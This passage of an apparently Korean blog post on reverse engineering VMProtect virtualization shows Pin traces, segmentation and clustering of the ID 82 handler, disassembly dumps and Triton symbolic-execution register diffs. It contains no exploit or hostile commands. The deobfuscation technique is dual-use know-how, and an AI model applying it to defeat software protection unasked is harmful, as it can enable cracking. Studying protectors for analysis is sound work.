class="hljs-number">0x0045cb37</span> EDI=<span class="hljs-number">0x00432085</span> EBP=<span class="hljs-number">0x0019fcd0</span> ESP=<span class="hljs-number">0x0019fc10</span> BYTECODE=<span class="hljs-number">0x1ec6b25f</span>ID82_003: IP=<span class="hljs-number">0x004323ff</span> EAX=<span class="hljs-number">0xfffdab5b</span> EBX=<span class="hljs-number">0xffbb44ce</span> ECX=<span class="hljs-number">0xdcedb11a</span> EDX=<span class="hljs-number">0x00000000</span> ESI=<span class="hljs-number">0x0046ef99</span> EDI=<span class="hljs-number">0x0043cc41</span> EBP=<span class="hljs-number">0x0019fcc0</span> ESP=<span class="hljs-number">0x0019fc00</span> BYTECODE=<span class="hljs-number">0x1ec5393d</span># Total ID82 calls: <span class="hljs-number">3</span></code></pre><p>&#xADF8;&#xB9AC;&#xACE0; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xC815;&#xBCF4;&#xAC00; &#xCD94;&#xCD9C;&#xB41C; &#xD30C;&#xC77C;&#xC785;&#xB2C8;&#xB2E4;. VM Entry &#xC2DC;&#xC810;&#xC758; &#xCD08;&#xAE30; &#xC0C1;&#xD0DC;&#xC640; &#xAC01; ID 82 &#xD638;&#xCD9C; &#xC9C1;&#xC804;&#xC758; &#xC2E4;&#xC81C; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xAC12;&#xACFC; &#xD568;&#xAED8; BYTECODE &#xAC12;&#xAE4C;&#xC9C0; &#xD55C;&#xC904;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xB3C4;&#xB85D; &#xAD6C;&#xC131;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, &#xC800;&#xB294; ID 82 &#xD578;&#xB4E4;&#xB7EC;&#xC758; &#xCF54;&#xB4DC; + &#xC785;&#xB825; + &#xCD08;&#xAE30; &#xC0C1;&#xD0DC; &#xC138; &#xAC00;&#xC9C0; &#xBAA9;&#xC801;&#xC744; &#xBAA8;&#xB450; &#xCD94;&#xCD9C;&#xD558;&#xC5EC;, &#xD558;&#xB098;&#xC758; VM opcode &#xAD6C;&#xD604;&#xC744; &#xC644;&#xC804;&#xD788; &#xBCF5;&#xC6D0;&#xD558;&#xB824;&#xB294; &#xBAA9;&#xC801;&#xC5D0; &#xB9DE;&#xAC8C; pin&#xC744; &#xC124;&#xACC4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><h3 id="VM-only-trace&#xC5D0;&#xC11C;-ID-82-&#xC2E4;&#xD589;-&#xAD6C;&#xAC04;-&#xBD84;&#xB9AC;"><a href="#VM-only-trace&#xC5D0;&#xC11C;-ID-82-&#xC2E4;&#xD589;-&#xAD6C;&#xAC04;-&#xBD84;&#xB9AC;" class="headerlink" title="VM-only trace&#xC5D0;&#xC11C; ID 82 &#xC2E4;&#xD589; &#xAD6C;&#xAC04; &#xBD84;&#xB9AC;"></a>VM-only trace&#xC5D0;&#xC11C; ID 82 &#xC2E4;&#xD589; &#xAD6C;&#xAC04; &#xBD84;&#xB9AC;</h3><p>&#xC55E;&#xC11C; &#xC218;&#xC9D1;&#xD55C; &#xB85C;&#xADF8;&#xB97C; &#xBC14;&#xD0D5;&#xC73C;&#xB85C;, &#xC774;&#xC81C; &#xAC1C;&#xBCC4; VM &#xD578;&#xB4E4;&#xB7EC; &#xC758;&#xBBF8;&#xB97C; &#xBCF5;&#xC6D0;&#xD574;&#xBCF4;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">total ins: <span class="hljs-number">58414</span>ID82 entries: <span class="hljs-number">107</span><span class="hljs-function">ID82 <span class="hljs-title">segments</span> <span class="hljs-params">(with glue)</span>: 106</span>written id82_segments.json</code></pre><p>&#xC774;&#xB97C; &#xC704;&#xD574; &#xC55E;&#xC11C; Pin&#xC73C;&#xB85C; &#xCD94;&#xCD9C;&#xD55C; <code>vmtrace.out</code>&#xC5D0;&#xC11C; ID 82&#xAC00; &#xC2E4;&#xD589;&#xB41C; &#xAD6C;&#xAC04;&#xC5D0;&#xC11C;, ID 82&#xAC00; &#xC2E4;&#xD589;&#xB41C; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xBCC4;&#xB85C; segment&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xB3C4;&#xB85D; &#xC798;&#xB77C;&#xB0B4;&#xB294; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xAC1C;&#xBC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC55E;&#xC11C; &#xD655;&#xC778;&#xD588;&#xB358; ID 82&#xC758; Entries&#xB294; 107&#xBC88;&#xC774; &#xB098;&#xC654;&#xC73C;&#xBA70;, segments&#xAC00; 106&#xAE4C;&#xC9C0; <code>json</code> &#xD30C;&#xC77C; &#xC548;&#xC5D0; &#xCD94;&#xCD9C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;!  </p><pre><code class="hljs c">{  <span class="hljs-string">&quot;idx&quot;</span>: <span class="hljs-number">1</span>,  <span class="hljs-string">&quot;start_ip&quot;</span>: <span class="hljs-number">4293051</span>,  <span class="hljs-string">&quot;end_ip&quot;</span>: <span class="hljs-number">4715143</span>,  <span class="hljs-string">&quot;ins&quot;</span>: [    <span class="hljs-string">&quot;004181bb FF E7&quot;</span>,    <span class="hljs-string">&quot;00468429 8B C5&quot;</span>,    <span class="hljs-string">&quot;0046842b 66 85 F2&quot;</span>,    <span class="hljs-string">&quot;0046842e 81 ED 04 00 00 00&quot;</span>,    <span class="hljs-string">&quot;00468434 66 3B FE&quot;</span>,    <span class="hljs-string">&quot;00468437 89 44 25 00&quot;</span>,    <span class="hljs-string">&quot;0046843b 9F&quot;</span>,    <span class="hljs-string">&quot;0046843c 13 C6&quot;</span>,    <span class="hljs-string">&quot;0046843e E9 C1 EC FE FF&quot;</span>,    <span class="hljs-string">&quot;00457104 8B 06&quot;</span>,    <span class="hljs-string">&quot;00457106 3B E6&quot;</span>,    <span class="hljs-string">&quot;00457108 81 C6 04 00 00 00&quot;</span>,    <span class="hljs-string">&quot;0045710e 33 C3&quot;</span>,    <span class="hljs-string">&quot;00457110 E9 BB 7D FE FF&quot;</span>,    <span class="hljs-string">&quot;0043eed0 D1 C8&quot;</span>,    <span class="hljs-string">&quot;0043eed2 35 B9 3D CB 4A&quot;</span>,    <span class="hljs-string">&quot;0043eed7 F5&quot;</span>,    <span class="hljs-string">&quot;0043eed8 F9&quot;</span>,    <span class="hljs-string">&quot;0043eed9 66 85 C4&quot;</span>,    <span class="hljs-string">&quot;0043eedc 2D 40 01 8C 45&quot;</span>,    <span class="hljs-string">&quot;0043eee1 E9 FC 23 FF FF&quot;</span>,    <span class="hljs-string">&quot;004312e2 D1 C0&quot;</span>,    <span class="hljs-string">&quot;004312e4 33 D8&quot;</span>,    <span class="hljs-string">&quot;004312e6 03 F8&quot;</span>,    <span class="hljs-string">&quot;004312e8 E9 B3 DE 02 00&quot;</span>,    <span class="hljs-string">&quot;0045f1a0 E9 02 B7 FE FF&quot;</span>,    <span class="hljs-string">&quot;0044a8a7 8D 44 24 60&quot;</span>,    <span class="hljs-string">&quot;0044a8ab F5&quot;</span>,    <span class="hljs-string">&quot;0044a8ac 3B E8&quot;</span>,    <span class="hljs-string">&quot;0044a8ae E9 D4 49 03 00&quot;</span>,    <span class="hljs-string">&quot;0047f287 0F 87 2E 8F F9 FF&quot;</span>  ]}</code></pre><p>&#xCD94;&#xCD9C;&#xB41C; segment&#xB294; ID 82 &#xC9C4;&#xC785; &#x2192; &#xC5EC;&#xB7EC; glue/ &#xACF5;&#xD1B5; &#xCF54;&#xB4DC; &#x2192; &#xB514;&#xC2A4;&#xD328;&#xCC98; &#xBCF5;&#xADC0;&#xAE4C;&#xC9C0; &#xD55C; &#xBC88;&#xC758; &#xC2E4;&#xD589; &#xD750;&#xB984;&#xC744; &#xADF8;&#xB300;&#xB85C; &#xB2F4;&#xACE0; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC; &#xC544;&#xC9C1; VMProtect&#xAC00; &#xB123;&#xC740; &#xB178;&#xC774;&#xC988;&#xAC00; &#xB9CE;&#xC774; &#xC11E;&#xC5EC;&#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC544;&#xC9C1; &#xC774;&#xAC83;&#xB9CC;&#xC73C;&#xB85C;&#xB294; &#xD578;&#xB4E4;&#xB7EC; &#xC21C;&#xC218; &#xBCF8;&#xCCB4;&#xB97C; &#xBD84;&#xB9AC;&#xD55C; &#xC0C1;&#xD0DC;&#xB294; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xACC4;&#xC18D; &#xC9C4;&#xD589;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.  </p><h3 id="ID-82-&#xD328;&#xD134;-&#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xB9C1;"><a href="#ID-82-&#xD328;&#xD134;-&#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xB9C1;" class="headerlink" title="ID 82 &#xD328;&#xD134; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xB9C1;"></a>ID 82 &#xD328;&#xD134; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xB9C1;</h3><pre><code class="hljs c">total segments: <span class="hljs-number">106</span>unique patterns: <span class="hljs-number">70</span>==== pattern <span class="hljs-number">1</span> size <span class="hljs-number">5</span>indices: [<span class="hljs-number">20</span>, <span class="hljs-number">40</span>, <span class="hljs-number">60</span>, <span class="hljs-number">78</span>, <span class="hljs-number">94</span>]==== pattern <span class="hljs-number">2</span> size <span class="hljs-number">5</span>indices: [<span class="hljs-number">21</span>, <span class="hljs-number">43</span>, <span class="hljs-number">62</span>, <span class="hljs-number">82</span>, <span class="hljs-number">99</span>]==== pattern <span class="hljs-number">3</span> size <span class="hljs-number">4</span>indices: [<span class="hljs-number">19</span>, <span class="hljs-number">39</span>, <span class="hljs-number">59</span>, <span class="hljs-number">93</span>]==== pattern <span class="hljs-number">4</span> size <span class="hljs-number">4</span>indices: [<span class="hljs-number">22</span>, <span class="hljs-number">65</span>, <span class="hljs-number">84</span>, <span class="hljs-number">103</span>]...</code></pre><p>&#xB2E4;&#xC74C; &#xB2E8;&#xACC4;&#xB85C;&#xB294; &#xC55E;&#xC11C; &#xC0DD;&#xC131;&#xD588;&#xB358; <code>json</code> &#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xC5EC; &#xAC01; segment&#xC758; &#xBC14;&#xC774;&#xD2B8; &#xC2DC;&#xD000;&#xC2A4;&#xB97C; &#xBE44;&#xAD50;&#xD558;&#xACE0;, &#xC644;&#xC804;&#xD788; &#xB3D9;&#xC77C;&#xD55C; &#xD328;&#xD134;&#xB07C;&#xB9AC; &#xBB36;&#xB294; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC81C;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xB098;&#xC758; ID&#xC5D0;&#xC11C; &#xAC01;&#xAC01;&#xC758; Segment &#xB4E4;&#xC744; &#xC11C;&#xB85C; &#xBE44;&#xAD50;(&#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xB9C1;)&#xD558;&#xBA74;, &#xAC01; Segment&#xB9C8;&#xB2E4; &#xC11C;&#xB85C; &#xC644;&#xC804;&#xD788; &#xC77C;&#xCE58;&#xD558;&#xB294; &#xD328;&#xD134;&#xC774; &#xC0DD;&#xAE41;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C;&#xB4E4;&#xBA74; &#xD328;&#xD134; 1&#xC740; Segment 20, 40, 60, 78, 94&#xAC00; &#xBAA8;&#xB450; &#xAC19;&#xC740; &#xD328;&#xD134;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xACE0;, &#xC774;&#xB97C; &#xAC19;&#xC740; &#xB9AC;&#xC2A4;&#xD2B8;&#xC5D0; &#xBB36;&#xC5B4;&#xB454; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC774; &#xACFC;&#xC815;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB294; &#xC774;&#xC720;&#xB294;, &#xC774; &#xD328;&#xD134; &#xC911; &#xD558;&#xB098;&#xB97C; &#xACE8;&#xB77C; &#xB300;&#xD45C; ID 82 &#xD578;&#xB4E4;&#xB7EC; &#xCF54;&#xB4DC;&#xB85C; &#xC0BC;&#xC544; &#xC758;&#xBBF8;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xAE30;&#xC900; &#xC0D8;&#xD50C;&#xB85C; &#xD65C;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xC785;&#xB2C8;&#xB2E4;.  </p><h3 id="Triton&#xC73C;&#xB85C;-ID-82-&#xD578;&#xB4E4;&#xB7EC;-&#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;"><a href="#Triton&#xC73C;&#xB85C;-ID-82-&#xD578;&#xB4E4;&#xB7EC;-&#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;" class="headerlink" title="Triton&#xC73C;&#xB85C; ID 82 &#xD578;&#xB4E4;&#xB7EC; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;"></a>Triton&#xC73C;&#xB85C; ID 82 &#xD578;&#xB4E4;&#xB7EC; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;</h3><p>&#xC774;&#xC804;&#xC5D0; ID 82 &#xD328;&#xD134; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xB9C1; &#xD55C; &#xACB0;&#xACFC;&#xB97C; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; pattern 1&#xC5D0;&#xC11C; index 20&#xC744; &#xB300;&#xD45C;&#xB85C; &#xACE8;&#xB77C;&#xC11C;, &#xADF8; segment&#xC758; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xB97C; &#xD558;&#xB098;&#xC758; &#xC5F0;&#xC18D;&#xB41C; x86 &#xCF54;&#xB4DC;&#xB85C; &#xB364;&#xD504;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">written id82_handler.<span class="hljs-keyword">asm</span> from idx <span class="hljs-number">20</span><span class="hljs-number">004181b</span>b FF E7<span class="hljs-number">0044f</span>a7a <span class="hljs-number">0F</span> B6 <span class="hljs-number">06</span><span class="hljs-number">0044f</span>a7d <span class="hljs-number">81</span> C6 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><span class="hljs-number">0044f</span>a83 <span class="hljs-number">32</span> C3<span class="hljs-number">0044f</span>a85 <span class="hljs-number">66</span> F7 C2 DE <span class="hljs-number">7B</span><span class="hljs-number">0044f</span>a8a F9<span class="hljs-number">0044f</span>a8b <span class="hljs-number">2</span>C <span class="hljs-number">3</span>A<span class="hljs-number">0044f</span>a8d D0 C8<span class="hljs-number">0044f</span>a8f F6 D8<span class="hljs-number">0044f</span>a91 E9 <span class="hljs-number">48</span> <span class="hljs-number">9B</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span></code></pre><p>&#xC774; &#xACB0;&#xACFC;&#xB97C; &#xC815;&#xC801;&#xBD84;&#xC11D;&#xD55C; IDA &#xB514;&#xC2A4;&#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xC640; &#xBE44;&#xAD50;&#xD558;&#xBA74; &#xAD6C;&#xC870;&#xAC00; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC815;&#xB9AC;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.  </p><p><img src="/2025/12/11/banda/VMPpart2/ko/image15.png" alt></p><p><code>0x004181BB: FF E7 &#x2192; 0x004181BB jmp edi</code>&#xB294;, &#xB514;&#xC2A4;&#xD328;&#xCC98;&#xC5D0;&#xC11C; EDI&#xC5D0; &#xD578;&#xB4E4;&#xB7EC; &#xC9C4;&#xC785; &#xC8FC;&#xC18C;&#xB97C; &#xB123;&#xC740; &#xB4A4;, <code>jmp</code>&#xD558;&#xB294; &#xAE00;&#xB8E8; &#xC9C4;&#xC785;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.  </p><p><img src="/2025/12/11/banda/VMPpart2/ko/image16.png" alt></p><p>&#xADF8;&#xB9AC;&#xACE0; <code>0x0044FA7A</code> &#xC774;&#xD6C4;&#xBD80;&#xD130;&#xAC00; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xBC14;&#xB85C; ID 82&#xC758; &#xBCF8;&#xCCB4; &#xC804;&#xBC18;&#xBD80;&#xB97C; &#xC54C;&#xC544;&#xB0B8; &#xAC83;&#xC778;&#xB370;&#xC694;.<br>&#xC704; &#xD750;&#xB984;&#xC740; <code>movzx eax, byte ptr [esi]</code> / <code>add esi, 1</code>&#xB85C; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xC758; &#xCCAB; &#xBC14;&#xC774;&#xD2B8;(opcode)&#xB97C; &#xC77D;&#xACE0;, &#xC774;&#xD6C4; <code>AL</code>&#xC744; <code>XOR</code>, <code>SUB</code>, <code>ROR</code>, <code>NEG</code> &#xB4F1;&#xC73C;&#xB85C; &#xC11E;&#xC740; &#xB4A4; &#xB2E4;&#xC74C; &#xC704;&#xCE58;&#xB85C; &#xC810;&#xD504;&#xD558;&#xB294; &#xD750;&#xB984;&#xC744; &#xBCF4;&#xC5EC;&#xC8FC;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>esi</code>&#xC5D0;&#xC11C; 4&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xC77D;&#xC5B4; &#xC554;&#xD638;&#xB97C; &#xD480;&#xACE0;, <code>EBX</code>&#xB97C; &#xC0C8; &#xC0C1;&#xC218; &#xAC12;&#xC73C;&#xB85C; &#xAC31;&#xC2E0;&#xD55C; &#xB4A4;, &#xB2E4;&#xC2DC; &#xB514;&#xC2A4;&#xD328;&#xCC98; &#xB8E8;&#xD504;(<code>0x4323ff</code>)&#xB85C; &#xBCF5;&#xADC0;&#xD558;&#xB294; &#xAC83;&#xAE4C;&#xC9C0; &#xD655;&#xC778;&#xB429;&#xB2C8;&#xB2E4;. &#xC989;, Pin trace&#xC640; IDA &#xB514;&#xC2A4;&#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xB97C; &#xACB0;&#xD569;&#xD574; &#xBCF4;&#xBA74;, <code>trace.out</code> &#xAE30;&#xC900;&#xC73C;&#xB85C; ID 82 &#xD578;&#xB4E4;&#xB7EC;&#xC758; &#xC644;&#xC804;&#xD55C; native &#xCF54;&#xB4DC;&#xB97C; &#xBCF5;&#xAD6C;&#xD55C; &#xC0C1;&#xD0DC;&#xAE4C;&#xC9C0; &#xC628; &#xAC70;&#xC5D0;&#xC694;. &#xAC70;&#xC758; &#xB2E4; &#xC654;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC5EC;&#xAE30;&#xC11C; &#xB05D;&#xC774; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xC774; &#xCF54;&#xB4DC;&#xC758; &#xC218;&#xD559;&#xC801; &#xBCC0;&#xD658;&#xC744; &#xC54C;&#xC544;&#xB0B4;&#xAE30; &#xC704;&#xD574;, &#xC774; &#xCF54;&#xB4DC;&#xB97C; Triton&#xC5D0; &#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xC55E;&#xC11C; &#xC218;&#xC9D1;&#xD55C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC640; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC; &#xCD08;&#xAE30; &#xAC12;&#xC744; &#xB123;&#xC5B4;&#xC11C; Symbolic Execution&#xC744; &#xC218;&#xD589;&#xD574;&#xC57C; &#xADF8; &#xBCF8;&#xC9C8;&#xC744; &#xC54C; &#xC218; &#xC788;&#xB294; &#xAC83;&#xC774;&#xC8E0;.  </p><h3 id="&#xC0C1;&#xD0DC;-&#xBCC0;&#xD654;-&#xB85C;&#xADF8;-&#xCD94;&#xC801;"><a href="#&#xC0C1;&#xD0DC;-&#xBCC0;&#xD654;-&#xB85C;&#xADF8;-&#xCD94;&#xC801;" class="headerlink" title="&#xC0C1;&#xD0DC; &#xBCC0;&#xD654; &#xB85C;&#xADF8; &#xCD94;&#xC801;"></a>&#xC0C1;&#xD0DC; &#xBCC0;&#xD654; &#xB85C;&#xADF8; &#xCD94;&#xC801;</h3><p>Triton&#xC744; &#xC0AC;&#xC6A9;&#xD574; ID 82 &#xC2E4;&#xD589; &#xC804;&#xB7;&#xD6C4;&#xC758; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xBE44;&#xAD50;&#xD55C; &#xACB0;&#xACFC;, &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC911;&#xC694;&#xD55C; &#xD328;&#xD134;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0x4442f2</span>: shr dh, cl<span class="hljs-number">0x43641a</span>: <span class="hljs-keyword">not</span> bp--- [ Logic Start (0x41F637) ] ---<span class="hljs-number">0x41f638</span>: movsx edi, di<span class="hljs-number">0x41f63c</span>: lahf<span class="hljs-number">0x41f63d</span>: bts ebp, esi<span class="hljs-number">0x41f641</span>: cmp bh, <span class="hljs-number">0xb4</span><span class="hljs-number">0x41f645</span>: shr bp, <span class="hljs-number">0xa6</span><span class="hljs-number">0x41f649</span>: sub ebx, edx<span class="hljs-number">0x41f64b</span>: test esi, ebp<span class="hljs-number">0x41f64e</span>: xchg ah, bh<span class="hljs-number">0x41f650</span>: sub ax, bx<span class="hljs-number">0x41f653</span>: movsx ebx, bp<span class="hljs-number">0x41f656</span>: mov eax, <span class="hljs-number">0</span><span class="hljs-number">0x41f65b</span>: <span class="hljs-keyword">not</span> si<span class="hljs-number">0x41f65e</span>: xadd ebp, esi<span class="hljs-number">0x41f662</span>: mov esi, dword ptr [esp + <span class="hljs-number">0x28</span>]<span class="hljs-number">0x41f666</span>: add esi, <span class="hljs-number">0x55106798</span><span class="hljs-number">0x41f66c</span>: neg esi<span class="hljs-number">0x41f66e</span>: rol edi, <span class="hljs-number">0x70</span><span class="hljs-number">0x41f671</span>: add esi, <span class="hljs-number">0x69733a52</span><span class="hljs-number">0x41f677</span>: btr ebp, <span class="hljs-number">0xc0</span><span class="hljs-number">0x41f67b</span>: rol esi, <span class="hljs-number">1</span><span class="hljs-number">0x41f67d</span>: sbb ebx, <span class="hljs-number">0x37516d2d</span><span class="hljs-number">0x41f683</span>: <span class="hljs-keyword">not</span> esi<span class="hljs-number">0x41f685</span>: clc<span class="hljs-number">0x41f686</span>: cmp eax, esp<span class="hljs-number">0x41f688</span>: <span class="hljs-keyword">xor</span> ebp, esp<span class="hljs-number">0x41f68a</span>: add esi, eax<span class="hljs-number">0x41f68c</span>: setns al<span class="hljs-number">0x41f68f</span>: mov ebp, esp<span class="hljs-number">0x41f691</span>: sub bx, sp<span class="hljs-number">0x41f694</span>: rol ax, cl<span class="hljs-number">0x41f697</span>: dec di<span class="hljs-number">0x41f69a</span>: sub esp, <span class="hljs-number">0xc0</span><span class="hljs-number">0x41f6a0</span>: jmp <span class="hljs-number">0x453e79</span><span class="hljs-number">0x453e79</span>: mov ebx, esi<span class="hljs-number">0x453e7b</span>: bt eax, esp<span class="hljs-number">0x453e7e</span>: btc ax, <span class="hljs-number">0x47</span><span class="hljs-number">0x453e83</span>: btr eax, edx<span class="hljs-number">0x453e86</span>: mov eax, <span class="hljs-number">0</span><span class="hljs-number">0x453e8b</span>: jmp <span class="hljs-number">0x4620dd</span><span class="hljs-number">0x4620dd</span>: sub ebx, eax<span class="hljs-number">0x4620df</span>: shld eax, eax, <span class="hljs-number">0xe3</span><span class="hljs-number">0x4620e3</span>: sub eax, edi<span class="hljs-number">0x4620e5</span>: stc<span class="hljs-number">0x4620e6</span>: lea edi, [<span class="hljs-number">0x4620e6</span>]<span class="hljs-number">0x4620ec</span>: mov eax, dword ptr [esi]<span class="hljs-number">0x4620ee</span>: cmc<span class="hljs-number">0x4620ef</span>: test cl, <span class="hljs-number">0x19</span><span class="hljs-number">0x4620f2</span>: lea esi, [esi + <span class="hljs-number">4</span>]<span class="hljs-number">0x4620f8</span>: cmc<span class="hljs-number">0x4620f9</span>: test ebx, <span class="hljs-number">0x76f532e4</span><span class="hljs-number">0x4620ff</span>: <span class="hljs-keyword">xor</span> eax, ebx<span class="hljs-number">0x462101</span>: ror eax, <span class="hljs-number">1</span><span class="hljs-number">0x462103</span>: stc<span class="hljs-number">0x462104</span>: <span class="hljs-keyword">xor</span> eax, <span class="hljs-number">0x4acb3db9</span><span class="hljs-number">0x462109</span>: sub eax, <span class="hljs-number">0x458c0140</span><span class="hljs-number">0x46210e</span>: rol eax, <span class="hljs-number">1</span><span class="hljs-number">0x462110</span>: <span class="hljs-keyword">xor</span> ebx, eax<span class="hljs-number">0x462112</span>: cmc<span class="hljs-number">0x462113</span>: cmp bx, sp<span class="hljs-number">0x462116</span>: clc<span class="hljs-number">0x462117</span>: add edi, eax<span class="hljs-number">0x462119</span>: jmp <span class="hljs-number">0x4323ff</span>--- [ Logic End (0x432400) ] ---</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB294; Triton &#xAE30;&#xBC18; &#xBD84;&#xC11D; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xCC0D;&#xC740; <code>asm</code> &#xCF54;&#xB4DC;&#xB85C;, <code>vmtrace.out</code>&#xC640; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; ID 82 &#xD578;&#xB4E4;&#xB7EC; &#xC2E4;&#xD589; &#xACBD;&#xB85C;&#xB97C; &#xC7AC;&#xD604;&#xD574;&#xC11C; &#xB514;&#xC2A4;&#xC5B4;&#xC148;&#xBE14;&#xD55C; &#xACB0;&#xACFC;&#xB97C; &#xC800;&#xC7A5;&#xD55C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;! Triton&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; ID 82 &#xC2E4;&#xD589; &#xC804; &#xD6C4; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xBE44;&#xAD50;&#xD55C; &#xACB0;&#xACFC;, &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC911;&#xC694;&#xD55C; &#xD328;&#xD134;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><pre><code class="hljs c">=== <span class="hljs-keyword">case</span> <span class="hljs-number">1</span> bc = <span class="hljs-number">0x1ecbf564</span>init EAX = <span class="hljs-number">0x271c9</span> EBX = <span class="hljs-number">0x458b96</span> ESI = <span class="hljs-number">0x47fa63</span> EDI = <span class="hljs-number">0x4892af</span><span class="hljs-keyword">final</span> EAX = <span class="hljs-number">0x19fe78</span><span class="hljs-keyword">final</span> EBX = <span class="hljs-number">0xafe65f2</span><span class="hljs-keyword">final</span> ECX = <span class="hljs-number">0x20</span><span class="hljs-keyword">final</span> EDX = <span class="hljs-number">0x0</span><span class="hljs-keyword">final</span> ESI = <span class="hljs-number">0x47fa68</span><span class="hljs-keyword">final</span> EDI = <span class="hljs-number">0xb0480ee</span><span class="hljs-keyword">final</span> EBP = <span class="hljs-number">0x19fed4</span><span class="hljs-keyword">final</span> ESP = <span class="hljs-number">0x19fe18</span>diff EAX = <span class="hljs-number">0x1b8fb1</span> EBX diff = <span class="hljs-number">0xabbee64</span>=== <span class="hljs-keyword">case</span> <span class="hljs-number">2</span> bc = <span class="hljs-number">0x1ec6b25f</span>init EAX = <span class="hljs-number">0xfffcff9f</span> EBX = <span class="hljs-number">0xffb934ac</span> ESI = <span class="hljs-number">0x45cb37</span> EDI = <span class="hljs-number">0x432085</span><span class="hljs-keyword">final</span> EAX = <span class="hljs-number">0x19fc70</span><span class="hljs-keyword">final</span> EBX = <span class="hljs-number">0x20ae78f3</span><span class="hljs-keyword">final</span> ECX = <span class="hljs-number">0x20</span><span class="hljs-keyword">final</span> EDX = <span class="hljs-number">0x422a</span><span class="hljs-keyword">final</span> ESI = <span class="hljs-number">0x45cb3c</span><span class="hljs-keyword">final</span> EDI = <span class="hljs-number">0xdf5a6d09</span><span class="hljs-keyword">final</span> EBP = <span class="hljs-number">0x19fccc</span><span class="hljs-keyword">final</span> ESP = <span class="hljs-number">0x19fc10</span>diff EAX = <span class="hljs-number">0xffe503ef</span> EBX diff = <span class="hljs-number">0xdf174c5f</span>=== <span class="hljs-keyword">case</span> <span class="hljs-number">3</span> bc = <span class="hljs-number">0x1ec5393d</span>init EAX = <span class="hljs-number">0xfffdab5b</span> EBX = <span class="hljs-number">0xffbb44ce</span> ESI = <span class="hljs-number">0x46ef99</span> EDI = <span class="hljs-number">0x43cc41</span><span class="hljs-keyword">final</span> EAX = <span class="hljs-number">0x19fc60</span><span class="hljs-keyword">final</span> EBX = <span class="hljs-number">0x20ae78f3</span><span class="hljs-keyword">final</span> ECX = <span class="hljs-number">0xdcedb11a</span><span class="hljs-keyword">final</span> EDX = <span class="hljs-number">0x0</span><span 